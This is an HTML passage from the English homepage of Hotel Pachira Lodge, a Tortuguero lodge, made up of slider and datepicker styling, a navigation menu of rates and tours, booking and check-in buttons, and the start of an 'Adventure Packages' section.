<script type="text/javascript">function setREVStartSize(a){try{var b,c=document.getElementById(a.c).parentNode.offsetWidth;if(c=0===c||isNaN(c)?window.innerWidth:c,a.tabw=void 0===a.tabw?0:parseInt(a.tabw),a.thumbw=void 0===a.thumbw?0:parseInt(a.thumbw),a.tabh=void 0===a.tabh?0:parseInt(a.tabh),a.thumbh=void 0===a.thumbh?0:parseInt(a.thumbh),a.tabhide=void 0===a.tabhide?0:parseInt(a.tabhide),a.thumbhide=void 0===a.thumbhide?0:parseInt(a.thumbhide),a.mh=void 0===a.mh||""==a.mh?0:a.mh,"fullscreen"===a.layout||"fullscreen"===a.l)b=Math.max(a.mh,window.innerHeight);else{for(var d in a.gw=Array.isArray(a.gw)?a.gw:[a.gw],a.rl)(void 0===a.gw[d]||0===a.gw[d])&&(a.gw[d]=a.gw[d-1]);for(var d in a.gh=void 0===a.el||""===a.el||Array.isArray(a.el)&&0==a.el.length?a.gh:a.el,a.gh=Array.isArray(a.gh)?a.gh:[a.gh],a.rl)(void 0===a.gh[d]||0===a.gh[d])&&(a.gh[d]=a.gh[d-1]);var e,f=Array(a.rl.length),g=0;for(var d in a.tabw=a.tabhide>=c?0:a.tabw,a.thumbw=a.thumbhide>=c?0:a.thumbw,a.tabh=a.tabhide>=c?0:a.tabh,a.thumbh=a.thumbhide>=c?0:a.thumbh,a.rl)f[d]=a.rl[d]<window.innerWidth?0:a.rl[d];for(var d in e=f[0],f)e>f[d]&&0<f[d]&&(e=f[d],g=d);var h=c>a.gw[g]+a.tabw+a.thumbw?1:(c-(a.tabw+a.thumbw))/a.gw[g];b=a.gh[g]*h+(a.tabh+a.thumbh)}void 0===window.rs_init_css&&(window.rs_init_css=document.head.appendChild(document.createElement("style"))),document.getElementById(a.c).height=b,window.rs_init_css.innerHTML+="#"+a.c+"_wrapper { height: "+b+"px }"}catch(a){console.log("Failure at Presize of Slider:"+a)}};</script>
		<style type="text/css" id="wp-custom-css">
			.img-personalizado{
	width:50px;
	height:50px;
	opacity: 0.5;
}

#header.no-banner .header_content,
#header.sonora-no-header-transparent #header_content {
    background-color: #65bc45;
	}
#header .header_menu .menu > li > a {
	font-size: 12px;
	font-weight: 500;
	letter-spacing:.1px;
	padding-left:3px;
  padding-right:2px;

}

.vc_carousel-inner {
	box-shadow: 12px 12px 2px 1px rgba(101, 188, 70, .80);
}

#header.no-banner, #header.sonora-no-header-transparent {
	background: #65bc45;
}
.header_right__social a {
	color: #ffff;
	line-height: 36px;
	font-size: 14px;
}
#wpforms-submit-2000 {
	color: #ffff;
}
.page-template-template-front-page .mphb_sc_search-wrapper {
  margin: 5.125em 0 5em;
}
@media screen and (min-width: 48em) {
.page-template-template-front-page .mphb_sc_search-form {
    -webkit-align-items: flex-end;
    align-items: flex-end;
    display: -webkit-box;
    display: -moz-box;
    display: -ms-flexbox;
    display: -webkit-flex;
    display: flex;
    -webkit-flex-wrap: wrap;
    flex-wrap: wrap;
    -webkit-justify-content: center;
    justify-content: center;
    margin-top: -1rem;
  }
  .page-template-template-front-page .mphb_sc_search-form p {
    padding-top: 1rem;
    margin-bottom: 0;
    min-width: 244px;
    width: auto;
    margin-right: 1.25em;
  }
  .page-template-template-front-page .mphb_sc_search-form p select {
    width: 100%;
  }
  .page-template-template-front-page .mphb_sc_search-form input[type='text'] {
    width: 100%;
  }
  .page-template-template-front-page .mphb_sc_search-form .mphb_sc_search-check-in-date, .page-template-template-front-page  .mphb_sc_search-form .mphb_sc_search-check-out-date {
    width: 244px;
  }
  .page-template-template-front-page  .mphb_sc_search-form .mphb_sc_search-adults, .page-template-template-front-page  .mphb_sc_search-form .mphb_sc_search-children {
    min-width: 102px;
  }
  .page-template-template-front-page .mphb_sc_search-form .mphb_sc_search-submit-button-wrapper {
    margin-top: 0;
    min-width: 0;
    margin-right: 0;
  }
}
.mphb-required-fields-tip{
	display:none;
}
input[type='text'].mphb-datepick.is-datepick {
  padding-right: 2.7em;
  -webkit-appearance: none;
  -moz-appearance: none;
  background-image: url(images/calendar-o.html);
  background-repeat: no-repeat;
  background-position: right 1.0625em top 1em;
  -moz-background-size: 1rem;
  -o-background-size: 1rem;
  -webkit-background-size: 1rem;
  background-size: 1rem;
}
/*--------------------------------------------------------------
# Datepicker
--------------------------------------------------------------*/
.datepick-popup .datepick-month-header select, .datepick-popup .datepick-month-header input,
.mphb-calendar .datepick-month-header select,
.mphb-calendar .datepick-month-header input {
  width: auto;
  display: inline-block;
  margin: 0em;
  padding: 0em;
  border: none;
  font-size: 100%;
}
.datepick-popup .datepick-month-header select,
.mphb-calendar .datepick-month-header select {
  padding-right: 1.7em;
}
.datepick-popup .datepick-cmd-next,
.datepick-popup .datepick-cmd-prev,
.mphb-calendar .datepick-cmd-next,
.mphb-calendar .datepick-cmd-prev {
  text-indent: 1000px;
  overflow: hidden;
}
.datepick-popup .datepick-cmd-next:before,
.datepick-popup .datepick-cmd-prev:before,
.mphb-calendar .datepick-cmd-next:before,
.mphb-calendar .datepick-cmd-prev:before {
  font: normal normal normal 1rem/1 FontAwesome;
  font-size: 16px;
  font-size: 1rem;
  text-rendering: auto;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  display: inline-block;
  text-indent: 0;
  margin: 0;
  position: absolute;
  top: 50%;
  right: 1em;
  transform: translateY(-50%);
}
.datepick-popup .datepick-cmd-prev:before,
.mphb-calendar .datepick-cmd-prev:before {
  right: auto;
  left: 1em;
}
.datepick-popup a.datepick-cmd,
.mphb-calendar a.datepick-cmd {
  padding: 0 1em;
  position: relative;
}
.datepick-popup .datepick-cmd-next:before,
.mphb-calendar .datepick-cmd-next:before {
  content: "";
  float: right;
}
.datepick-popup .datepick-cmd-prev:before,
.mphb-calendar .datepick-cmd-prev:before {
  content: "";
  float: left;
}
.mphb-calendar .datepick,
.datepick-popup .datepick {
  font-size: 90%;
  border: 0px solid #dddddd;
  border-radius: 0;
  width: 31.429em;
  max-width: 100%;
  font-family: inherit;
}

.mphb-calendar a,
.datepick-popup a {
  -webkit-box-shadow: none;
  box-shadow: none;
}

.mphb-calendar .datepick-nav, .mphb-calendar .datepick-ctrl,
.datepick-popup .datepick-nav,
.datepick-popup .datepick-ctrl {
  font-size: inherit;
  font-weight: normal;
}

.mphb-calendar .datepick-nav,
.datepick-popup .datepick-nav {
  background-color: #fff;
  border-bottom: 1px solid #dddddd;
}

.mphb-calendar .datepick-nav a,
.datepick-popup .datepick-nav a {
  color: #4f4f4f;
}

.mphb-calendar .datepick-nav a:hover,
.datepick-popup .datepick-nav a:hover {
  background-color: #fff;
  color: #4f4f4f;
}

.mphb-calendar .datepick-nav a.datepick-disabled,
.datepick-popup .datepick-nav a.datepick-disabled {
  cursor: not-allowed;
  color: #9f9f9f;
}

.mphb-calendar .datepick-nav a.datepick-disabled:hover,
.datepick-popup .datepick-nav a.datepick-disabled:hover {
  background-color: #fff;
}

.mphb-calendar .datepick-ctrl,
.datepick-popup .datepick-ctrl {
  border-bottom: 1px solid #eee;
  background-color: #fff;
}

.mphb-calendar .datepick-ctrl a,
.datepick-popup .datepick-ctrl a {
  color: #00ca4c;
  text-transform: lowercase;
  width: 50%;
}

.mphb-calendar .datepick-ctrl a + a,
.datepick-popup .datepick-ctrl a + a {
  border-left: 1px solid #eee;
}

.mphb-calendar .datepick-ctrl .datepick-cmd:hover,
.datepick-popup .datepick-ctrl .datepick-cmd:hover {
  background-color: #fff;
  color: #484848;
}

.mphb-calendar a.datepick-cmd,
.datepick-popup a.datepick-cmd {
  height: 2.5rem;
  line-height: 2.5rem;
}

.mphb-calendar a.datepick-cmd.datepick-cmd-today,
.datepick-popup a.datepick-cmd.datepick-cmd-today {
  width: 40%;
}

.mphb-calendar .datepick-month-header, .mphb-calendar .datepick-month-header select, .mphb-calendar .datepick-month-header input,
.datepick-popup .datepick-month-header,
.datepick-popup .datepick-month-header select,
.datepick-popup .datepick-month-header input {
  height: 2.778em;
  background-color: #fff;
  color: #4f4f4f;
  font-weight: 400;
  line-height: 2.778em;
  font-family: inherit;
}

.mphb-calendar .datepick-month,
.datepick-popup .datepick-month {
  width: 100%;
  border: 0px solid #dfdfdf;
}

.mphb-calendar .datepick-month thead,
.datepick-popup .datepick-month thead {
  border-bottom: 0;
}

@media screen and (min-width: 768px) {
  .mphb-calendar .datepick-month,
  .datepick-popup .datepick-month {
    width: 50%;
  }
  .mphb-calendar .datepick-month.last,
  .datepick-popup .datepick-month.last {
    border-left: 0px solid #dfdfdf;
  }
  .mphb-calendar .datepick-month.first,
  .datepick-popup .datepick-month.first {
    border-right: 0px solid #dfdfdf;
  }
}

@media screen and (min-width: 48em) {
  .mphb-calendar .datepick-month + .datepick-month,
  .datepick-popup .datepick-month + .datepick-month {
    border-left: 1px solid #dddddd;
    padding-right: 0;
  }
}

@media screen and (min-width: 48em) {
  .mphb-calendar .datepick-month + .datepick-month .datepick-month-header,
  .datepick-popup .datepick-month + .datepick-month .datepick-month-header {
    margin-right: 0;
  }
}

.mphb-calendar .datepick-month table,
.datepick-popup .datepick-month table {
  margin: 0 auto;
  width: 100%;
}

.mphb-calendar .datepick-month tbody,
.datepick-popup .datepick-month tbody {
  line-height: 2.1em;
}

.mphb-calendar .datepick-month th,
.datepick-popup .datepick-month th {
  border: none;
  font-size: 0.875rem;
  font-weight: 400;
  padding: 0.875rem 0;
}

.mphb-calendar .datepick-month th,
.mphb-calendar .datepick-month th a,
.datepick-popup .datepick-month th,
.datepick-popup .datepick-month th a {
  background-color: #f2f2f2;
  color: #808080;
}

.mphb-calendar .datepick-month td,
.datepick-popup .datepick-month td {
  background-color: #fff;
  border: none;
}

.mphb-calendar .datepick-month a,
.datepick-popup .datepick-month a {
  padding: 0;
  background-color: #fff;
  color: #484848;
}

.mphb-calendar .datepick-month span,
.datepick-popup .datepick-month span {
  padding: 0;
}

.mphb-calendar .datepick-month td span,
.datepick-popup .datepick-month td span {
  color: #bcbcbc;
}

.mphb-calendar .datepick-month td .datepick-weekend,
.datepick-popup .datepick-month td .datepick-weekend {
  background-color: #fff;
}

.mphb-calendar a,
.datepick-popup a {
  -webkit-transition: 0.3s background, 0.3s color;
  transition: 0.3s background, 0.3s color;
}

.mphb-calendar.mphb-datepick .datepick-month td .mphb-available-date {
  background-color: #e1f0c0;
  color: #484848;
}

.mphb-calendar.mphb-datepick .datepick-month td .mphb-not-stay-in-date:not(.mphb-past-date),
.mphb-calendar.mphb-datepick .datepick-month td .mphb-not-available-date,
.datepick-popup .mphb-datepick-popup .datepick-month td .mphb-not-stay-in-date:not(.mphb-past-date),
.datepick-popup .mphb-datepick-popup .datepick-month td .mphb-not-available-date {
  background-color: #fff;
  color: #9f9f9f;
  text-decoration: line-through;
}

.mphb-calendar.mphb-datepick .datepick-month td .mphb-past-date,
.datepick-popup .mphb-datepick-popup .datepick-month td .mphb-past-date {
  opacity: 1;
  background-color: #fff;
  color: #bcbcbc;
}

.mphb-calendar.mphb-datepick .datepick-month td .mphb-earlier-min-date,
.mphb-calendar.mphb-datepick .datepick-month td .mphb-later-max-date,
.datepick-popup .mphb-datepick-popup .datepick-month td .mphb-earlier-min-date,
.datepick-popup .mphb-datepick-popup .datepick-month td .mphb-later-max-date {
  background-color: #fff;
  color: #bcbcbc;
  text-decoration: line-through;
  opacity: 1;
}

.mphb-calendar.mphb-datepick .datepick-month td .datepick-selected,
.datepick-popup .mphb-datepick-popup .datepick-month td .datepick-selected {
  background-color: #00ca4c;
  color: #fff;
}

.mphb-calendar.mphb-datepick .datepick-month td .mphb-booked-date,
.datepick-popup .mphb-datepick-popup .datepick-month td .mphb-booked-date {
  opacity: 1;
}

.datepick-popup {
  -webkit-box-shadow: 0 4px 8px rgba(51, 51, 51, 0.15);
  box-shadow: 0 4px 8px rgba(51, 51, 51, 0.15);
}

.datepick-popup .mphb-datepick-popup .datepick-month td .datepick-today {
  background-color: #fff;
  font-weight: 400;
  color: #00ca4c;
}

.datepick-popup .mphb-datepick-popup .datepick-month td .mphb-booked-date:not(.mphb-selectable-date) {
  background-color: #fff;
  color: #9f9f9f;
  text-decoration: line-through;
}

.datepick-popup .mphb-datepick-popup .datepick-month td a.datepick-highlight {
  background-color: #00ca4c;
  color: #fff;
}

.datepick-popup .mphb-datepick-popup.mphb-check-in-datepick .datepick-month td .mphb-not-check-in-date:not(.mphb-past-date) {
  background-color: #fff;
  color: #9f9f9f;
  text-decoration: line-through;
}

.datepick-popup .mphb-datepick-popup.mphb-check-out-datepick .datepick-month td .mphb-not-check-out-date:not(.mphb-past-date) {
  background-color: #fff;
  color: #9f9f9f;
  text-decoration: line-through;
}

.datepick-popup .mphb-datepick-popup.mphb-check-out-datepick .datepick-month td span.mphb-check-in-date:not(.mphb-past-date) {
  background-color: #475764;
  color: #fff;
  text-decoration: none;
}

.mphb-calendar.mphb-datepick .datepick-month td .mphb-booked-date {
  background-color: #00ca4c;
  text-decoration: none;
}

.datepick-popup {
  max-width: 100%;
}

.mphb-calendar .datepick {
  border: 1px solid #dddddd;
  overflow: hidden;
}

.datepick-cmd-current, .datepick-cmd-today {
  width: 40%;
  font-size: 14px;
  font-size: 0.875rem;
}

.mphb-calendar.mphb-datepick .datepick-month td .mphb-booked-date {
  background-color: #f0c0c0;
  text-decoration: none;
  color: #4f4f4f;
}

.mphb-calendar.mphb-datepick .datepick-month td .mphb-booked-date.mphb-date-check-in.mphb-date-check-out {
  background-color: #f0c0c0;
}

.mphb-calendar.mphb-datepick .datepick-month td .mphb-booked-date.mphb-date-check-in {
  background: -webkit-gradient(linear, left top, right bottom, color-stop(0, #e1f0c0), color-stop(50%, #e1f0c0), color-stop(50%, #f0c0c0), to(#f0c0c0));
  background: linear-gradient(to bottom right, #e1f0c0 0, #e1f0c0 50%, #f0c0c0 50%, #f0c0c0 100%);
}

.mphb-calendar.mphb-datepick .datepick-month td .mphb-available-date.mphb-date-check-out {
  background: -webkit-gradient(linear, left top, right bottom, color-stop(0, #f0c0c0), color-stop(50%, #f0c0c0), color-stop(50%, #e1f0c0), to(#e1f0c0));
  background: linear-gradient(to bottom right, #f0c0c0 0, #f0c0c0 50%, #e1f0c0 50%, #e1f0c0 100%);
}
.datepick-popup {
	z-index: 10000;
}
.header_content{padding-bottom:10px;}
.header_logo img {
	max-height: 75px;
}

#footer .widget p,
#footer .widget a {
	color: #fff;
	margin: 0;
	padding: 0;
	font-size: 16px;
}

.footer_bottom--column {
	color: #fff;
}		</style>
		<style type="text/css" data-type="vc_shortcodes-custom-css">.vc_custom_1574110007844{background-image: url(/resources/uploads/2019/10/fondoArtboard-1-18376.png?id=5116) !important;background-position: center !important;background-repeat: no-repeat !important;background-size: cover !important;}.vc_custom_1668551160671{background-image: url(/resources/uploads/2022/11/fondoArtboard-1-1.png?id=8759) !important;}.vc_custom_1573422066751{background-image: url(/resources/uploads/2019/10/fondo-sliderArtboard-1.png?id=5120) !important;background-position: center !important;background-repeat: no-repeat !important;background-size: cover !important;}.vc_custom_1599187752653{margin-top: -200px !important;}.vc_custom_1623213163288{margin-top: 175px !important;}.vc_custom_1622520543846{margin-right: 10px !important;}.vc_custom_1623210471017{margin-left: 10px !important;}.vc_custom_1623213134201{margin-bottom: -20px !important;}.vc_custom_1599372863769{margin-top: -20px !important;margin-right: -20px !important;margin-bottom: -20px !important;margin-left: -20px !important;background-color: rgba(255,255,255,0.01) !important;*background-color: rgb(255,255,255) !important;}.vc_custom_1623211862101{margin-top: 5px !important;}.vc_custom_1600121510084{margin-top: 10px !important;margin-right: 10px !important;margin-bottom: 10px !important;margin-left: 10px !important;}.vc_custom_1600121522943{margin-top: 10px !important;margin-right: 10px !important;margin-bottom: 10px !important;margin-left: 10px !important;}.vc_custom_1600121550585{margin-top: 10px !important;margin-right: 10px !important;margin-bottom: 10px !important;margin-left: 10px !important;}.vc_custom_1600121566473{margin-top: 10px !important;margin-right: 10px !important;margin-bottom: 10px !important;margin-left: 10px !important;}.vc_custom_1570930651217{margin-bottom: 0px !important;}.vc_custom_1599430813297{background-position: center !important;background-repeat: no-repeat !important;background-size: contain !important;}.vc_custom_1600126686760{background-position: center !important;background-repeat: no-repeat !important;background-size: contain !important;}.vc_custom_1600126715681{background-position: center !important;background-repeat: no-repeat !important;background-size: contain !important;}.vc_custom_1602029276325{background-position: center !important;background-repeat: no-repeat !important;background-size: contain !important;}.vc_custom_1599409950458{margin-top: -20px !important;margin-right: -20px !important;margin-bottom: -20px !important;margin-left: -20px !important;background-color: rgba(255,255,255,0.01) !important;*background-color: rgb(255,255,255) !important;}.vc_custom_1600808795420{background-position: center !important;background-repeat: no-repeat !important;background-size: contain !important;}</style><noscript><style type="text/css"> .wpb_animate_when_almost_visible { opacity: 1; }</style></noscript></head>


<body class="sonora-no-header-transparent wpb-js-composer js-comp-ver-5.7 vc_responsive"> <!--<![endif]-->

<!-- PAGE WRAP -->
<div id="page-wrap">
    <div id="sonora-backtop" class="sonora-backtop">
        <a href="#">
            <span class="sonora sonora-icon-left-arrow"></span>
        </a>
    </div>
            <!-- HEADER -->
        <header id="header"
                class=" sonora-no-header-transparent">
            <!-- HEADER TOP -->
                        <div class="header_top">
                <div class="container">
                    <div class="inner">
                                                <div class="row">
                            <div class="header_left col-xs-12 col-sm-6 col-lg-5">
                                
                                </div>

                                                            <div class="col-xs-12 col-sm-6  col-lg-push-3 col-lg-4 header_right">
                                    <div class="header_right__social">
                                                                                    <a href="https://www.facebook.com/pages/category/Hotel-Resort/pachira-lodge-105911009460357/" target="_blank"><i class="fa fa-facebook fa-2x"></i></a><a href="https://instagram.com/pachiralodge?igshid=x6q2lm3r4xcg" target="_blank"><i class="fa fa-instagram fa-2x"></i></a>
<a href="https://api.whatsapp.com/send?phone=50622578830&text=Can%20you%20give%20me%20more%20information%3F" target="_blank"><i class="fa fa-whatsapp fa-2x"></i></a>                                                                            </div>
                                                                    </div>
                            
                                                    </div>
                    </div>
                </div>
                <!-- END / HEADER TOP -->
                
                <!-- HEADER LOGO & MENU -->
                                <div id="header_content" class="header_content    sticky-enable">

                    <div class="container">
                        <div class="logo-left logo-left--js">
                            <!-- HEADER LOGO -->
                                <div class="header_logo">
                <a title="Hotel Pachira Lodge"
           href="index.html"><img
                    src="/resources/uploads/2020/08/Pachira_Logo_blanco_alpha.png"
                    alt="Hotel Pachira Lodge"></a>
    </div>

                                <!-- END / HEADER LOGO -->
                        </div>
                        <!-- HEADER MENU -->
                        <nav class="header_menu">
                            <div class="menu-header">
                                <h3>Menu</h3>
                                <button class="close" type="button">x</button>
                            </div>
                            <div class="menu-english-container"><ul id="menu-english" class="menu sonora2-menu"><li id="menu-item-8276" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8276"><a href="tortuguero-2.html">Tortuguero</a></li>
<li id="menu-item-8277" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8277"><a href="lodge-2.html">Lodge<span class="fa fa-caret-down"></span>
<ul class="sub-menu">
	<li id="menu-item-8278" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8278"><a href="special-events.html">SPECIAL EVENTS</a></li>
</ul></a>
<li id="menu-item-6703" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6703"><a href="hotel_locacion-2.html">Location</a></li>
<li id="menu-item-8253" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-8253"><a href="#">Rates<span class="fa fa-caret-down"></span></a>
<ul class="sub-menu">
	<li id="menu-item-8278" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8278"><a href="2-days-1-night.html">Two Days / One Night</a></li>
	<li id="menu-item-6769" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6769"><a href="3-days-2-nights.html">Three Days / Two Nights</a></li>
	<li id="menu-item-6787" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6787"><a href="3-days-2-nights-2.html">Four Days / Three Nights</a></li>
	<li id="menu-item-6795" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6795"><a href="five-days-four-nights.html">Five Days / Four Nights</a></li>
</ul>
</li>
<li id="menu-item-6736" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-6736"><a href="tours-additional.html">Additional Tours<span class="fa fa-caret-down"></span></a>
<ul class="sub-menu">
	<li id="menu-item-6847" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6847"><a href="spa-3-2.html">SPA SERVICES</a></li>
<li id="menu-item-6847" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6847"><a href="hiking-tour.html">HIKING TOUR</a></li>
<li id="menu-item-6847" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6847"><a href="night-walk.html">NIGHT WALK TOUR</a></li>
<li id="menu-item-6847" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6847"><a href="morning-tour.html">MORNING TOUR</a></li>
<li id="menu-item-6847" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6847"><a href="yoga.html">YOGA</a></li>

	<li id="menu-item-6851" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6851"><a href="spawning.html">SPAWNING</a></li>
</ul>
</li>
<li id="menu-item-6807" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6807"><a href="frequently-asked-questions.html">Faq</a></li>
<li id="menu-item-6807" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-6807"><a href="contact.html">Contact Us</a></li>
<li id="menu-item-6591" class="pll-parent-menu-item menu-item menu-item-type-custom menu-item-object-custom current-menu-parent menu-item-has-children menu-item-6591"><a href="#pll_switcher"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAALCAMAAABBPP0LAAAAt1BMVEWSmb66z+18msdig8La3u+tYX9IaLc7W7BagbmcUW+kqMr/q6n+//+hsNv/lIr/jIGMnNLJyOP9/fyQttT/wb3/////aWn+YWF5kNT0oqz0i4ueqtIZNJjhvt/8gn//WVr/6+rN1+o9RKZwgcMPJpX/VFT9UEn+RUX8Ozv2Ly+FGzdYZrfU1e/8LS/lQkG/mbVUX60AE231hHtcdMb0mp3qYFTFwNu3w9prcqSURGNDaaIUMX5FNW5wYt7AAAAAjklEQVR4AR3HNUJEMQCGwf+L8RR36ajR+1+CEuvRdd8kK9MNAiRQNgJmVDAt1yM6kSzYVJUsPNssAk5N7ZFKjVNFAY4co6TAOI+kyQm+LFUEBEKKzuWUNB7rSH/rSnvOulOGk+QlXTBqMIrfYX4tSe2nP3iRa/KNK7uTmWJ5a9+erZ3d+18od4ytiZdvZyuKWy8o3UpTVAAAAABJRU5ErkJggg==" alt="English" width="16" height="11" style="width: 16px; height: 11px;" /><span class="fa fa-caret-down"></span></a>
<ul class="sub-menu">
	<li id="menu-item-6591-en" class="lang-item lang-item-88 lang-item-en current-lang lang-item-first menu-item menu-item-type-custom menu-item-object-custom current_page_item menu-item-home menu-item-6591-en"><a href="index.html" hreflang="en-GB" lang="en-GB"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAALCAMAAABBPP0LAAAAt1BMVEWSmb66z+18msdig8La3u+tYX9IaLc7W7BagbmcUW+kqMr/q6n+//+hsNv/lIr/jIGMnNLJyOP9/fyQttT/wb3/////aWn+YWF5kNT0oqz0i4ueqtIZNJjhvt/8gn//WVr/6+rN1+o9RKZwgcMPJpX/VFT9UEn+RUX8Ozv2Ly+FGzdYZrfU1e/8LS/lQkG/mbVUX60AE231hHtcdMb0mp3qYFTFwNu3w9prcqSURGNDaaIUMX5FNW5wYt7AAAAAjklEQVR4AR3HNUJEMQCGwf+L8RR36ajR+1+CEuvRdd8kK9MNAiRQNgJmVDAt1yM6kSzYVJUsPNssAk5N7ZFKjVNFAY4co6TAOI+kyQm+LFUEBEKKzuWUNB7rSH/rSnvOulOGk+QlXTBqMIrfYX4tSe2nP3iRa/KNK7uTmWJ5a9+erZ3d+18od4ytiZdvZyuKWy8o3UpTVAAAAABJRU5ErkJggg==" alt="English" width="16" height="11" style="width: 16px; height: 11px;" />English</a></li>
	<li id="menu-item-6591-es" class="lang-item lang-item-92 lang-item-es menu-item menu-item-type-custom menu-item-object-custom menu-item-6591-es"><a href="/es/" hreflang="es-CR" lang="es-CR"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAALCAMAAABBPP0LAAAAe1BMVEUACYYAAHoAAGwAAFmUqdWMo9GCm815kshxjMT7/v75+vr19/fi5eX5oqL81dX6ycj2v7/0t7bgaGbgAADxcnPtUFDqRkboPj7mNzflLy/kJibiGxu6AADfEhLdDw/xh4Xwrq3tpKTUPjzy8/Nohb5dfLgAACEAAEgAADT3QOSVAAAATklEQVR4AQXBMQ4BABAAwdnLkRCJVqH0/3/p9AQzgRAhi4jk3QmIoN2CEL/ZY5FK+RwGUimTRalkyl5ehSthpvMvxA08myW5E2riQfjCH0mcB8B5WEZHAAAAAElFTkSuQmCC" alt="Español" width="16" height="11" style="width: 16px; height: 11px;" />Español</a></li>
</ul>
</li>
</ul></div>                        </nav>
                        <!-- END / HEADER MENU -->

                        <!-- MENU BAR -->
                        <div class="menu-bars"><span></span></div>
                        <!-- END / MENU BAR -->

                    </div>
                </div>
                <!-- END / HEADER LOGO & MENU -->

        </header>

        <!-- END / HEADER -->

        <!--End coming soon-->
    <!-- BLOG NORMAL-->
<div class="main-wrapper ">
        <div class="container">
                        <article class="clearfix article post-6631 page type-page status-publish hentry">
                <div class="entry-content clearfix">

<div data-vc-full-width="true" data-vc-full-width-init="true" data-vc-stretch-content="true" class="vc_row wpb_row vc_row-fluid vc_row-no-padding" style="position: relative; left: -314.6px; box-sizing: border-box; width: 100%;">

<div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner ">
    
    <div class="wpb_wrapper">
        
        <div class="slider">
    <ul>
        <li>
            <img src="https://pachiralodge.com/resources/uploads/2020/07/piscina-noche.png">
        </li>
        <li>
            <img src="https://pachiralodge.com/resources/uploads/2020/07/p.giocoso-0211-Costa-Rica-Tortuguero-056.jpg">
        </li>
        <li>
            <img src="https://pachiralodge.com/resources/uploads/2019/11/pachira_banner_0000_p.giocoso-0211-Costa-Rica-Tortuguero-049.png">
        </li>
        <li>
            <img src="https://pachiralodge.com/resources/uploads/2020/05/web-pachira_0013_image014.jpg.png">
        </li>
    </ul>
</div>
<div class="vc_row wpb_row vc_inner vc_row-fluid vc_custom_1599187752653">

<div class="wpb_column vc_column_container vc_col-xs-12"><div class="vc_column-inner"><div class="wpb_wrapper">
	<div class="wpb_single_image wpb_content_element vc_align_center">
		
		<figure class="wpb_wrapper vc_figure">
			<div class="vc_single_image-wrapper vc_box_shadow_3d  vc_box_border_grey"><img width="300" height="135" src="/resources/uploads/2020/08/Pachira_Logo_blanco_alpha-300x135.png" class="vc_single_image-img attachment-medium" alt="" decoding="async" srcset="/resources/uploads/2020/08/Pachira_Logo_blanco_alpha-300x135.png 300w, /resources/uploads/2020/08/Pachira_Logo_blanco_alpha-1024x462.png 1024w, /resources/uploads/2020/08/Pachira_Logo_blanco_alpha.png 768w, /resources/uploads/2020/08/Pachira_Logo_blanco_alpha.png 1099w" sizes="(max-width: 300px) 100vw, 300px"></div>
		</figure>
	</div>
</div></div></div></div></div></div></div></div>

<div class="vc_row-full-width">

</div>

<div class="vc_row wpb_row vc_inner vc_row-fluid">

<div class="wpb_column vc_column_container vc_col-xs-6 vc_hidden-xs"><div class="vc_column-inner vc_custom_1622520543846"><div class="wpb_wrapper">
	<div class="wpb_text_column wpb_content_element ">
		<div class="wpb_wrapper">
			<p style="text-align: right;"><span class="col col_shortcode"><a class="maxbutton-3 maxbutton maxbutton-book-now" target="_blank" rel="noopener" href="https://reservations.orbebooking.com/Search/Init/ATD6n/en/"><span class="mb-text">BOOK NOW</span></a> </span></p>

		</div>
	</div>
</div></div></div><div class="wpb_column vc_column_container vc_col-xs-6 vc_hidden-xs"><div class="vc_column-inner vc_custom_1623210471017"><div class="wpb_wrapper">
	<div class="wpb_text_column wpb_content_element ">
		<div class="wpb_wrapper">
			<p style="text-align: left;"><span class="col col_shortcode"><a class="maxbutton-1 maxbutton maxbutton-web-check-in" target="_blank" rel="noopener" href="https://fidelity.myhotel.cl/pachira-lodge-2556/prestay/login"><span class="mb-text">WEB CHECK IN</span></a> </span></p>

		</div>
	</div>
</div></div></div></div>

<div data-vc-full-width="true" data-vc-full-width-init="false" data-vc-stretch-content="true" class="vc_row wpb_row vc_row-fluid vc_custom_1574110007844 vc_row-has-fill vc_row-o-content-top vc_row-flex">

<div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 32px" ><span class="vc_empty_space_inner"></span></div>
<h2 style="font-size: 45px;color: #206842;line-height: bold;text-align: center;font-family:Cinzel;font-weight:700;font-style:normal" class="vc_custom_heading wpb_animate_when_almost_visible wpb_fadeIn fadeIn vc_custom_1599372863769" >Adventure Packages</h2><div class="vc_empty_space  hidden-xs"   style="height: 45px" ><span class="vc_empty_space_inner"></span></div>
<div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_100 vc_sep_border_width_3 vc_sep_pos_align_center vc_separator_no_text vc_sep_color_green vc_custom_1623211862101  vc_custom_1623211862101" ><span class="vc_sep_holder vc_sep_holder_l"><span  class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span  class="vc_sep_line"></span></span>
</div></div></div></div></div><div class="vc_row-full-width">

</div><section class="vc_section"><div class="vc_row wpb_row vc_row-fluid">

<div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 15px" ><span class="vc_empty_space_inner"></span></div>

	<div class="wpb_text_column wpb_content_element  wpb_animate_when_almost_visible wpb_zoomIn zoomIn" >
		<div class="wpb_wrapper">
